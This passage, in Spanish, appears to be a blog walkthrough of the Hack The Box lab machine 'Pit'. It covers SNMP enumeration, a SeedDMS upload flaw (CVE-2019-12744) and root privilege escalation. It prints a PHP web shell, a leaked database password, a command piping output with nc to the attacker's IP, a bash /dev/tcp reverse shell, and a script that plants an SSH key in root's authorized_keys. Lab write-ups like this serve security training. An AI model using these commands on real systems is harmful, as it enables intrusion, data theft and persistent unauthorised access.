+<p>Pero claramente obtenemos lo mismo (pero muy lento, en un rato entra <strong>snmpbulkwalk</strong> que nos ayudara a hacer muuuucho más rápido todo).</p>
+
+<p>Jugando con la guía inicial vemos que podemos extraer info en concreto de alguna <strong>OID</strong>, por ejemplo extraigamos la versión del sistema pasándole el <strong>OID</strong>:</p>
+
+<pre><code class="language-bash">❱ snmpwalk -v2c -c public 10.10.10.241
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+...
+</code></pre>
+
+<p>Sabemos que es la primera línea (para el ejemplo lo sabemos :P), pues ahora tomaríamos ese <strong>OID</strong> y ejecutaríamos:</p>
+
+<pre><code class="language-bash">❱ snmpwalk -v2c -c public 10.10.10.241 iso.3.6.1.2.1.1.1.0
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64"
+</code></pre>
+
+<p>Y nos traería la línea correspondiente a ese <strong>OID</strong> (:</p>
+
+<p>Algo que me di cuenta al jugar con esto es que podemos también pasarle “rangos”, por ejemplo:</p>
+
+<ul>
+  <li>Tenemos este <strong>OID</strong>: <code>iso.3.6.1.2.1.1.1.0</code>.</li>
+  <li>Podemos decirle que extraiga todo lo que inicie con este <strong>OID</strong>: <code>iso.3.6.1.2.1.1</code>.</li>
+</ul>
+
+<p>Nos mostraría solo esa info:</p>
+
+<pre><code class="language-bash">❱ snmpwalk -v2c -c public 10.10.10.241 iso.3.6.1.2.1.1
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk_exArangeOID.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Otra cosita interesante son las <strong>consultas extendidas</strong> que nos permiten profundizar un poco más en la extracción:</p>
+
+<ul>
+  <li><a href="http://www.circitor.fr/Mibs/Html/N/NET-SNMP-EXTEND-MIB.php">Extended Queries - <strong>NET-SNMP-EXTEND-MID</strong></a></li>
+</ul>
+
+<p>Jugando con ellas encontramos unos usuarios:</p>
+
+<pre><code class="language-bash">❱ snmpwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects                      
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk_ex_EXTENDobjects.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<ul>
+  <li>Al parecer un proceso de monitoreo o algo así que esta ejecutando un binario de la ruta <code>/usr/bin/monitor</code>. Es interesante porque no es un programa que me suene que venga por default en el sistema.</li>
+  <li>También vemos la versión del servidor <strong>CentOS</strong>.</li>
+  <li>El usuario <strong>root</strong>.</li>
+  <li>Y el usuario <strong>michelle</strong>.</li>
+</ul>
+
+<p>Esto podemos guardarlo por si algo (:</p>
+
+<h3 id="-snmpbulkwalk">📼 <u>snmpbulkwalk</u></h3>
+
+<p>🌲 <strong><em>The <code>snmpbulkwalk</code> command uses the <u>GETBULK SNMP</u> protocol feature to query for an entire tree of information about a network entity. This command <u>can pack more objects into the packets by specifying -repeaters-</u>.</em></strong> <a href="https://docs.oracle.com/cd/E19121-01/sf.x4140/820-6413-13/SNMP_commands_reference_appendix.html">Oracle - SNMP commands</a></p>
+
+<p>Acá si es necesario indicarle la versión <code>2</code> de <strong>SNMP</strong>… Como sabemos que podemos hacer lo mismo que <strong>snmpwalk</strong>, pero más rápido, vayamos directo a lo interesante:</p>
+
+<p>Vimos que podíamos extraer info de <strong>OIDs</strong> en concreto y también de <strong>OIDs</strong> de los que conocíamos su inicio…</p>
+
+<p>…</p>
+
+<h1 id="movimiento-lateral-dms">Encontrando ruta web hacia <u>SeedDMS</u> <a href="#movimiento-lateral-dms">#</a></h1>
+
+<p>Pues después de muchas pruebas intentamos extraer toooooooodo lo que inicie con <code>iso</code> (<strong>1</strong>) y al final (bien al final) encontramos algo distinto a lo que teníamos:</p>
+
+<pre><code class="language-bash">❱ snmpbulkwalk -v2c -c public 10.10.10.241 iso
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso.png" alt="346bash_snmpWalkbulk_ex_iso" /></p>
+
+<p>Opa, vemos que al parecer hay un servicio web en la ruta <code>/var/www/html</code> llamado <code>/seeddms51x</code>, pues podemos intentar a buscarlo en alguno de los puertos y dominios que tenemos a ver si lo encontramos…</p>
+
+<p>Finalmente al dirigirnos a:</p>
+
+<pre><code class="language-html">http://dms-pit.htb/seeddms51x/seeddms
+</code></pre>
+
+<p>Nos redirige a:</p>
+
+<pre><code class="language-html">http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F
+</code></pre>
+
+<p>Y nos muestra:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsLogin.png" alt="346page80dms_seeddmsLogin" /></p>
+
+<p>Un login de un <a href="https://www.sergroup.com/es/temas/que-es-dms.html">DMS</a> llamado <a href="https://www.seeddms.org/index.php?id=2"><strong>SeedDMS</strong></a> que es un sistema para la administración de documentos…</p>
+
+<p>Intentando algunas credenciales por default no logramos nada, pero al intentar con <strong>michelle</strong> (que fue uno de los usuarios que encontramos antes) como <em>usuario</em> y <em>contraseña</em> logramos acceder:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsDashboard.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones, vemos dos objetos, una carpeta llamada <strong>Docs</strong> y un archivo llamado <strong>Upgrade Note</strong>.</p>
+
+<p>En el upgrade nos indica que debido a los problemas de seguridad de la versión <code>5.1.10</code> el administrador decidió actualizar el servicio <strong>SeedDMS</strong> a la versión <code>5.1.15</code>.</p>
+
+<blockquote>
+  <p><strong>Esto es importante ya que concocemos que version de <code>SeedDMS</code> estamos usando, así evitamos estar tocando vulnerabilidades de otras versiones</strong>.</p>
+</blockquote>
+
+<p>En la carpeta <strong>Docs</strong> existe dentro una llamada <strong>Users</strong> y ahí residen dos más:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsDocsUsers.png" alt="346page80dms_seeddmsDocsUsers" /></p>
+
+<p>Bien, conocemos al usuario <strong>Jack</strong> (lo guardamos por si algo).</p>
+
+<p>Yyy solo podemos jugar con la carpeta de <strong>Michelle</strong>…</p>
+
+<p>Enumerando encontramos los mails de cada usuario, nos sirven para conocer los usuarios y a que dominio están asociados (por si algo e.e):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsUsers.png" alt="346page80dms_seeddmsUsers" /></p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Después de muuuuuuuuchas pruebas de exploits y cositas llamativas hacia la versión <code>5.1.15</code> no logramos nada :/ Así que empezamos a probar de todo…</p>
+
+<p>Antes de conocer la versión actual ya había probado este exploit, pero no me había funcionado:</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/47022">SeedDMS versions <strong>&lt; 5.1.11</strong> - Remote Command Execution</a>.</li>
+</ul>
+
+<p>Probando y probando extrañamente funciono, lo cual no debería ser, ya que es un exploit de otra versión 😐 pero pues pfff…</p>
+
+<p>Así que veamos como fue el proceso:</p>
+
+<p><span style="color: red;">1. </span> Creamos el archivo, se tiene que llamar <code>1.php</code>, no encontré el porqué, pero debe serlo, ya que con otros nombres no lo toma.</p>
+
+<pre><code class="language-bash">❱ cat 1.php 
+&lt;?php system($_GET['xmd']); ?&gt;
+</code></pre>
+
+<p><span style="color: red;">2. </span> Subimos el archivo al DMS.</p>
+
+<p><strong>SeedDMS</strong> (arriba a la izquierda) &gt; <strong>Docs</strong> &gt; <strong>Users</strong> &gt; <strong>Michelle</strong> &gt; <strong>Add document</strong> (arriba).</p>
+
+<p>Ahí en el nombre colocamos <code>1.php</code> y donde dice <strong>Local file</strong> seleccionamos el archivo <code>1.php</code> de nuestro sistema:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsAddDoc_1PHP.png" alt="346page80dms_seeddmsAddDoc_1PHP" /></p>
+
+<p>Y damos clic en <strong>Add document</strong>.</p>
+
+<p><span style="color: red;">3. </span> <strong>Encontramos</strong> el archivo subido en el servidor web.</p>
+
+<p>Cada archivo al existir tiene un <strong>ID</strong>, podemos verlo al dar clic sobre él y en la <strong>URL</strong> se reflejaría con el parámetro <code>documentid</code>, en nuestro caso es el número <strong>48</strong>.</p>
+
+<p>Siguiendo el exploit existen dos rutas que usa <strong>SeedDMS</strong> por default al subir archivos y guardarlos:</p>
+
+<ul>
+  <li><code>data</code> y <code>1048576</code>.</li>
+</ul>
+
+<hr />
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_seeddms_dataY1048576.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>Tomado de: <a href="https://github.com/rachmari/seeddms#data-storage">https://github.com/rachmari/seeddms</a>.</p>
+</blockquote>
+
+<p>Así que perfecto, tiene y toma sentido (:</p>
+
+<p>El exploit nos indica la siguiente ruta en la que debería existir el archivo:</p>
+
+<pre><code class="language-html">http://holacomoestas.com/data/1048576/&lt;document_id&gt;/1.php
+</code></pre>
+
+<p>Y con el <strong>id</strong>, el dominio y el comando a ejecutar quedaría así:</p>
+
+<pre><code class="language-html">http://dms-pit.htb/seeddms51x/seeddms/data/1048576/48/1.php?xmd=whoami
+</code></pre>
+
+<p>Peeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeero al direccionarnos hacia ella nos indica que no encuentra el archivo :s</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsRCE_fail_FnotFound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<h2 id="expl_seeddms">RCE SeedDMS (<u>CVE-2019-12744</u>) <a href="#expl_seeddms">📌</a></h2>
+
+<p>Jugando con internet buscando info relacionada con el directorio <strong>data</strong> y <strong>1048576</strong> encontramos este thread el cual nos da una idea para intentar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_seeddms_discussion_pathsDMS.png" alt="346google_seeddms_discussion_pathsDMS" /></p>
+
+<blockquote>
+  <p>Tomada de: <a href="https://sourceforge.net/p/seeddms/discussion/general/thread/5f4164990d/?limit=25">seeddms/discussion/general/installation-issues</a>.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://www.redhat.com/sysadmin/install-seeddms">Acá también hacen referencia al directorio <strong>data</strong></a>.</li>
+</ul>
+
+<p>(<strong>En la imagen podría haber usado la herramienta de texto, pero quedo aún más lindo 😅</strong>)</p>
+
+<p>Incluso el comentario de abajo le indica que esta configurado de manera insegura :P</p>
+
+<p>Parecen tachones lo que hay en la imagen, pero no, es lo que podemos intentar:</p>
+
+<pre><code class="language-html">http://dms-pit.htb/seeddms51x/seeddms
+</code></pre>
+
+<p>El <strong>DMS</strong> esta siendo mantenido en la ruta <code>/seeddms51x/seeddms</code>, pero podríamos intentar encontrar la carpeta <code>data...</code> fuera de él, o sea:</p>
+
+<pre><code class="language-html">http://dms-pit.htb/seeddms51x/data
+</code></pre>
+
+<p>Puessssssssssssss:</p>
+
+<pre><code class="language-bash">❱ curl -s -L http://dms-pit.htb/seeddms51x/algoqueesperonoexistaymehagaquedarmal/ | grep title
+&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
+</code></pre>
+
+<pre><code class="language-bash">❱ curl -s -L http://dms-pit.htb/seeddms51x/data/ | grep title
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+</code></pre>
+
+<p>Nos devuelve un <strong>forbidden</strong>, así que existe, pero no tenemos acceso a él :P Perfecto, pues ahora busquemos el archivo:</p>
+
+<pre><code class="language-bash">❱ curl http://dms-pit.htb/seeddms51x/data/1048576/48/1.php
+</code></pre>
+
+<p>No nos devuelve ningún error ni output, así que podemos pensar que lo encontró (: pues ejecutemos un <code>whoami</code> y un <code>hostname</code> a ver si nos responde:</p>
+
+<pre><code class="language-html">http://dms-pit.htb/seeddms51x/data/1048576/48/1.php?xmd=whoami; echo " - "; hostname
+</code></pre>
+
+<p>Yyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsRCE_whoamiYhostname.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listoneeeeeeeeeeeeeeeeeeeeeeees, que martirio estoo, pero tamos. Tenemos ejecución remota de comandos en el sistema como el usuario <strong>nginx</strong>, aprovechemos para generarnos una <strong>Reverse Shell</strong>.</p>
+
+<p>Después de algunos intentos no lo logramos, así que tendremos que enumerar el sistema desde el servidor web.</p>
+
+<p>Jugando con <strong>Python</strong> creamos una fake-shell:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py">fakeSheedDMS.py</a></p>
+</blockquote>
+
+<p><strong>Me gusto como quedo en cuanto a lo que hace el script, nos logeamos, subimos PHP y generamos la fake-shell, peeeero como el servidor borra cada cierto los archivos de la carpeta de **michelle</strong> pues jugamos con eso y cuando nos devuelva <code>File not found</code> volvemos a subir el archivo PHP sin perder la fake-shell :)**</p>
+
+<p>Es medio fea, ya que no podemos movernos de la carpeta en la que aparecemos, así que tenemos que jugar con rutas absolutas o <code>../../../</code> 😛</p>
+
+<p>…</p>
+
+<p>Recordé una utilidad de <a href="https://s4vitar.github.io/">S4vitar</a> que nos permite obtener una Shell en la que podemos movernos (<code>cd</code>) entre carpetas sin problemas, algo que en la nuestra no se puede. Esto lo hace jugando con tuberías y cositas locas, les dejo el link, ta buenasa:</p>
+
+<ul>
+  <li><a href="https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py">github.com/s4vitar - TTY Over HTTP</a>.</li>
+</ul>
+
+<p>Solo deberíamos cambiar la URL en la que este nuestro archivo <code>php</code> y en mi caso cambiar <code>cmd</code> a <code>xmd</code>…</p>
+
+<p>Pero como va un poco lento (por el tema de las tuberías) y como hicimos uno propio, pues juguemos con el propio e.e</p>
+
+<p>…</p>
+
+<h2 id="expl_settingsXML">Encontramos credenciales en el archivo settings.xml <a href="#expl_settingsXML">📌</a></h2>
+
+<p>Enumerando encontramos un archivo llamado <code>settings.xml</code>, en él vemos unas credenciales de una base de datos:</p>
+
+<pre><code class="language-bash">$ ls -la /var/www/html/seeddms51x/conf
+total 40
+drwxr-xr-x. 2 nginx nginx    93 Mar  2  2020 .
+drwxr-xr-x. 7 nginx nginx    68 Apr 21  2020 ..
+-rw-r--r--. 1 nginx nginx   261 Jan 15  2020 .htaccess
+-r--------. 1 nginx nginx 11933 Apr 21  2020 settings.xml
+-rw-r--r--. 1 nginx nginx 13771 Mar 14  2018 settings.xml.template
+-rw-r--r--. 1 nginx nginx  4247 Feb 20  2013 stopwords.txt
+</code></pre>
+
+<pre><code class="language-xml">...
+&lt;!--
+   - dbDriver: DB-Driver used by adodb (see adodb-readme)
+   - dbHostname: DB-Server
+   - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)
+   - dbUser: username for database-access
+   - dbPass: password for database-access
+--&gt;
+&lt;database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false"&gt;&lt;/database&gt;
+...
+</code></pre>
+
+<p>Como son del servidor de base de datos podemos probar a ver si encontramos alguna tabla con algo comprometedor o algo que podamos crackear…</p>
+
+<p>Como la Shell es una tristeza :P vamos a jugar con las herramientas <a href="https://www.thegeekstuff.com/2008/08/get-quick-info-on-mysql-db-table-column-and-index-using-mysqlshow/">mysqlshow</a> para ver que bases de datos y tablas existen yyy con <a href="https://www.linuxtotal.com.mx/index.php?cont=info_admon_021">mysqldump</a> para simular un “backup” de la info de esas tablas (o sea, nos muestra lo que contienen).</p>
+
+<p>(<strong>No encontramos nada útil, pero les dejo los comandos como aprendizaje</strong>)</p>
+
+<p>Vemos las bases de datos actuales (<code>-pPASSWORD</code>):</p>
+
+<pre><code class="language-bash">❱ python3 fakeSheedDMS.py
+nginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquu
+</code></pre>
+
+<p>Vemos las tablas de X base de datos, existe una llamada <strong>seeddms</strong>:</p>
+
+<pre><code class="language-bash">nginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquu seeddms
+</code></pre>
+
+<p>De todas las tablas existen 3 llamativas: <code>tblUserPasswordHistory</code>, <code>tblUserPasswordRequest</code> y <code>tblUsers</code>.</p>
+
+<p>Con <strong>mysqlshow</strong> podemos ver la estructura de cada tabla más no su información, juguemos con <strong>mysqldump</strong>:</p>
+
+<pre><code class="language-bash">nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUserPasswordHistory
+nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUserPasswordRequest
+nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUsers
+</code></pre>
+
+<p>La única que devuelve información es <code>tblUsers</code>, encontramos la password en formato hash <strong>MD5</strong>, pero al intentar crackearlas solo encontramos resultado con <strong>michelle</strong> (que seria <code>michelle</code> :P)</p>
+
+<p>…</p>
+
+<p>Jugando con <strong>SSH</strong> obtenemos este error siempre:</p>
+
+<pre><code class="language-bash">❱ ssh michelle@10.10.10.241
+michelle@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
+</code></pre>
+
+<p>Intentando arreglarlo no lo logramos :(</p>
+
+<p>…</p>
+
+<h1 id="expl_centos_login_done">Ejecución de comandos en servidor CentOS por medio de la interfaz web <a href="#expl_centos_login_done">#</a></h1>
+
+<p>Volviendo atrás recordé el login que teníamos contra el servidor <strong>CentOS</strong> con <code>cockpit</code>, ¿lo recuerdas? Pues probando esa contraseña con el usuario <strong>michelle</strong> logramos acceder (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_dashboard.png" alt="346page9090_dashboard" /></p>
+
+<p>Lissssssstones, enumerando un poquito la web encontramos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_terminalLink.png" alt="346page9090_terminalLink" /></p>
+
+<p>Damos clic y nos muestra esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_terminal.png" alt="346page9090_terminal" /></p>
+
+<p>Y sí, es una terminal, pero no vemos nada de lo que escribimos 🙃 interesante jajaj .__. Intentando comprobar si es funcional logramos cositas:</p>
+
+<p>Podemos decirle que nos envíe el resultado de un comando a algún puerto en el que estemos escuchando:</p>
+
+<p>Nos ponemos en escucha: <code>nc -lvp 4433</code>.</p>
+
+<p>Y ejecutamos (aunque no se vea) el comando <code>id</code>, tomara el resultado y lo enviara al puerto <strong>4433</strong> de nuestra máquina:</p>
+
+<pre><code class="language-bash">id | nc 10.10.14.146 4433
+</code></pre>
+
+<p>Damos enter y en nuestro listener recibimos:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+listening on [any] 4433 ...
+connect to [10.10.14.146] from pit.htb [10.10.10.241] 34018
+uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0
+</code></pre>
+
+<p>Opa, estamos ejecutando comandos como <strong>michelle</strong> (: comprobando el comando <code>hostname</code> nos devuelve <strong>pit.htb</strong> y jugando con <code>curL</code> comprobamos que existe el binario, así que podemos destacar que claramente <strong>nginx</strong> no tenía permisos contra algunos binarios (por si alguien se lo preguntaba :P)</p>
+
+<hr />
+
+<h3 id="obtenemos-reverse-shell-como-michelle"><u>Obtenemos reverse shell como michelle</u></h3>
+
+<p>Nos volvemos a poner en escucha y en la web ejecutamos:</p>
+
+<pre><code class="language-bash">bash -c 'bash &gt;&amp; /dev/tcp/10.10.14.146/4433 0&gt;&amp;1'
+</code></pre>
+
+<p>Lo que generara una bash hacia nuestro puerto… Dando enter obtenemos en nuestro listener:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_nc_michelleRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Tenemos una Shell pero bastante fea eh! Lo bueno es que podemos intentar el transformarla en una <strong>Full TTY</strong> o sea, que sea interactiva y que se vea bonita, hagámoslo rápidamente:</p>
+
+<p>Escribimos <code>script /dev/null -c bash</code>:</p>
+
+<pre><code class="language-bash">script /dev/null -c bash
+Script started, file is /dev/null
+[michelle@pit ~]$
+</code></pre>
+
+<p>La pausamos ejecutando <code>CTRL+Z</code>:</p>
+
+<pre><code class="language-bash">[michelle@pit ~]$ ^Z
+[1]+  Detenido                nc -lvp 4433
+</code></pre>
+
+<pre><code class="language-bash">❱ stty raw -echo; fg
+</code></pre>
+
+<p>Escribimos <code>reset</code> y ahora:</p>
+
+<pre><code class="language-bash">[michelle@pit ~]$ export TERM=xterm
+[michelle@pit ~]$ export SHELL=bash
+</code></pre>
+
+<p>Por último abrimos una nueva terminal y ejecutamos <code>stty -a</code>, tomamos esos valores, volvemos a la Shell de <strong>michelle</strong> y los escribimos en este comando (esos son mis valores):</p>
+
+<pre><code class="language-bash">[michelle@pit ~]$ stty rows 43 columns 192
+</code></pre>
+
+<p>Y listo, tenemos una Shell completamente interactiva, es bonita, podemos movernos entre comandos, tenemos histórico y no nos debemos preocupar si ejecutamos <code>CTRL+C</code>, ya que no la perderemos.</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Estando dentro del sistema la enumeración nos esta matando, no encontramos nada de nada…</p>
+
+<p>Hasta que recordé lo que habíamos visto con <strong>snmpbulkwalk</strong> al obtener los usuarios <strong>michelle</strong> y <strong>root</strong>, había un proceso de monitoreo en ejecución y había una cadena que hacía referencia a un binario:</p>
+
+<ul>
+  <li><code>/usb/bin/monitor</code>.</li>
+</ul>
+
+<p>Busquémoslo a ver si tiene algo que ver:</p>
+
+<pre><code class="language-bash">[michelle@pit ~]$ ls -la /usr/bin/monitor 
+-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor
+</code></pre>
+
+<pre><code class="language-bash">[michelle@pit ~]$ file /usr/bin/monitor 
+/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
+</code></pre>
+
+<p>Es un script, veamoslo:</p>
+
+<pre><code class="language-bash">[michelle@pit ~]$ cat /usr/bin/monitor 
+#!/bin/bash
+
+for script in /usr/local/monitoring/check*sh
+do
+    /bin/bash $script
+done
+</code></pre>
+
+<p>WTF… Un bucle que de la ruta <code>/usr/local/monitoring/</code> toma los archivos que empiecen por <code>check</code> y terminen en <code>sh</code> yyy los ejecuta… ¿ehhhh?</p>
+
+<p>Sí esta es la manera de escalar es muy sencillo, ya que simplemente deberíamos incluir un archivo en esa ruta con ese inicio, ese final y rogaríamos a la virgensita para que <strong>root</strong> tenga alguna tarea cron o servicio ejecutando <code>/usr/bin/monitor</code>.</p>
+
+<p>Veamos si tenemos <a href="https://ryanstutorials.net/bash-scripting-tutorial/bash-if-statements.php#test">permisos de escritura</a> con un <strong>if</strong> sobre la ruta:</p>
+
+<pre><code class="language-bash">[michelle@pit ~]$ if [ -w "/usr/local/monitoring" ]; then echo "WRITABLE"; else echo "NOT WRITABLE"; fi
+WRITABLE
+</code></pre>
+
+<p>Bien, al parecer si, para asegurarnos hacemos la fácil:</p>
+
+<pre><code class="language-bash">[michelle@pit ~]$ echo "holaaaaaaaaaaaaaaa" &gt; /usr/local/monitoring/hola.txt
+[michelle@pit ~]$ ls -la /usr/local/monitoring/hola.txt
+-rw-rw-r--. 1 michelle michelle 19 Jun 29 25:25 /usr/local/monitoring/hola.txt
+[michelle@pit ~]$ cat /usr/local/monitoring/hola.txt
+holaaaaaaaaaaaaaaa
+</code></pre>
+
+<p>Bien, confirmado. Entonces intentemos generar el archivo que colocaremos en esa ruta y veamos si pasa algo.</p>
+
+<hr />
+
+<h2 id="privesc_scriptcheck">Generamos script que ejecutará <u>/usr/bin/monitor</u> <a href="#privesc_scriptcheck">📌</a></h2>
+
+<p>Para validar que el script nos funcione podemos indicarle que haga varias cositas:</p>
+
+<pre><code class="language-bash">❱ cat checkea.sh
+#!/bin/bash
+
+id &gt; /home/michelle/id.txt
+id | nc 10.10.14.146 4435
+</code></pre>
+
+<p>Al ser ejecutado crearía un archivo en la ruta <code>/home/michelle/</code> llamado <code>id.txt</code> con el contenido del comando <code>id</code> (que debería ser del usuario <code>root</code>, o el que esté ejecutando <code>/usr/bin/monitor</code>) y enviaría el mismo resultado, pero a un puerto por el que estaremos escuchando…</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4435
+</code></pre>
+
+<p>Subimos el script:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<pre><code class="language-bash">[michelle@pit ~]$ mkdir testeando
+[michelle@pit ~]$ cd testeando/
+[michelle@pit ~/testeando]$ curl http://10.10.14.146:8000/checkea.sh -o checkea.sh
+</code></pre>
+
+<p>Ahora démosle permisos de ejecución:</p>
+
+<pre><code class="language-bash">[michelle@pit ~/testeando]$ chmod +x checkea.sh
+</code></pre>
+
+<p>Y finalmente lo copiamos a la ruta:</p>
+
+<pre><code class="language-bash">[michelle@pit ~/testeando]$ cp checkea.sh /usr/local/monitoring/
+</code></pre>
+
+<p>Ahora deberíamos esperar a ver que pasa…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_gif_carwithabigtree.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Y no pasa nada… 😀 (sonrió, pero no sonrió en realidad)</p>
+
+<p>Después de muchas pruebas e intentos logramos ver algo distinto…</p>
+
+<p>Subimos el archivo, lo copiamos a la ruta y todo igual, pero mientras estaba el archivo ahí se me dio por volver a probar el <strong>snmpbulkwalk</strong> por curiosidad sobre el proceso de “monitoreo” y vaya vaya:</p>
+
+<pre><code class="language-bash">❱ snmpbulkwalk -v2c -c public 10.10.10.241 iso
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso_foundScript.png" alt="346bash_snmpWalkbulk_ex_iso_foundScript" /></p>
+
+<p>Al menos sabemos que se esta intentando ejecutar el script, pero nos da <strong>Permission Denied</strong> contra el binario <code>netcat</code> y en la creación del archivo <code>id.txt</code>…</p>
+
+<p>De nuevo después de varias pruebas nos damos cuenta de que <code>/usr/bin/monitor</code> es ejecutado una vez jugamos con <strong>snmp</strong>… Yyyy al final, algo nos dio resultado:</p>
+
+<p>Podemos probar en guardar nuestra llave pública <strong>SSH</strong> en el archivo <code>/root/.ssh/authorized_keys</code>, esto le indicará al sistema que a todas las llaves (identificaciones) dentro de ese archivo les permita acceso, pero para obtener ese acceso debemos hacer uso de la llave privada (que sería el remplazo de una contraseña (ya que no la tenemos :P)) asociada a esa llave pública. Entonces si hacen match la llave pública guardada en <code>authorized_keys</code> con la llave privada indicada al intentarnos conectar por <strong>SSH</strong>, nos debería devolver una <strong>Shell</strong> como <strong>root</strong> (porque estamos guardando nuestra “credencial” en el archivo <code>authorized_keys</code> del usuario <strong>root</strong>), démosle:</p>
+
+<ul>
+  <li><a href="https://www.cyberciti.biz/faq/how-to-set-up-ssh-keys-on-linux-unix/">How To Set up SSH Keys on a Linux / Unix System</a>.</li>
+</ul>
+
+<p>Primero generamos nuestras llaves (si no las tenemos):</p>
+
+<p><strong>(De la forma sencilla)</strong></p>
+
+<pre><code class="language-bash">❱ ssh-keygen -t rsa
+</code></pre>
+
+<p>Finalmente deberíamos tener estos archivos en la carpeta <code>~/.ssh</code>:</p>
+
+<pre><code class="language-bash">❱ ls
+id_rsa  id_rsa.pub
+</code></pre>
+
+<ul>
+  <li><code>id_rsa</code> es nuestra llave privada (no compartir con nadie).</li>
+  <li><code>id_rsa.pub</code> es nuestra llave pública, esta es la que se usa para poder autenticarnos contra otros sistemas sin necesidad de proveer contraseñas.</li>
+</ul>
+
+<p>Listos, tomamos el contenido de la llave pública, lo pegamos en el script y le indicamos que tome tooooooooda la llave como una cadena de texto y la agregue en el archivo <code>/root/.ssh/authorized_keys</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_script_idRSApub.png" alt="346bash_script_idRSApub" /></p>
+
+<p>Ahora, subimos el script, lo copiamos a la ruta y ejecutamos <strong>snmpbulkwalk</strong>:</p>
+
+<pre><code class="language-bash">[michelle@pit ~/testeando]$ curl http://10.10.14.146:8000/checkea.sh -o checkea.sh
+[michelle@pit ~/testeando]$ chmod +x checkea.sh
+[michelle@pit ~/testeando]$ cp checkea.sh /usr/local/monitoring/
+[michelle@pit ~/testeando]$ ls -la /usr/local/monitoring/checkea.sh
